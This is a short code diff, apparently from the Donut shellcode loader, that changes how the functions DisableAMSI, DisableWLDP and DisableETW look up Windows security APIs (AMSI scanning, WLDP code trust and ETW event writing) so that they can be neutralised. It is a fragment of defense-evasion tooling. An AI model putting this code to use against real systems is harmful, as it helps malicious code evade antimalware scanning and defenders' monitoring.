@@ -93,7 +93,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     
     // resolve address of AmsiScanBuffer. if not found,
     // return FALSE because it should exist ...
-    cs = inst->api.GetProcAddress(dll, inst->amsiScanBuf);
+    cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
     if(cs == NULL) return FALSE;
     
     // calculate length of stub
@@ -118,7 +118,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
   
     // resolve address of AmsiScanString. if not found,
     // return FALSE because it should exist ...
-    cs = inst->api.GetProcAddress(dll, inst->amsiScanStr);
+    cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
     if(cs == NULL) return FALSE;
     
     // calculate length of stub
@@ -160,7 +160,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     
     // resolve address of AmsiScanBuffer. if unable, return
     // FALSE because it should exist.
-    cs = (PBYTE)inst->api.GetProcAddress(dll, inst->amsiScanBuf);
+    cs = (PBYTE)xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
     if(cs == NULL) return FALSE;
     
     // scan for signature
@@ -304,7 +304,7 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     
     // resolve address of WldpQueryDynamicCodeTrust
     // if not found, return FALSE because it should exist
-    cs = inst->api.GetProcAddress(wldp, inst->wldpQuery);
+    cs = xGetProcAddress(inst, wldp, inst->wldpQuery, 0);
     if(cs == NULL) return FALSE;
     
     // calculate length of stub
@@ -328,7 +328,7 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     
     // resolve address of WldpIsClassInApprovedList
     // if not found, return FALSE because it should exist
-    cs = inst->api.GetProcAddress(wldp, inst->wldpIsApproved);
+    cs = xGetProcAddress(inst, wldp, inst->wldpIsApproved, 0);
     if(cs == NULL) return FALSE;
     
     // calculate length of stub
@@ -372,7 +372,7 @@ BOOL DisableETW(PDONUT_INSTANCE inst) {
 
     // resolve address of EtwEventWrite
     // if not found, return FALSE because it should exist
-    cs = inst->api.GetProcAddress(dll, inst->etwEventWrite);
+    cs = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
     if (cs == NULL) return FALSE;
 
 #ifdef _WIN64
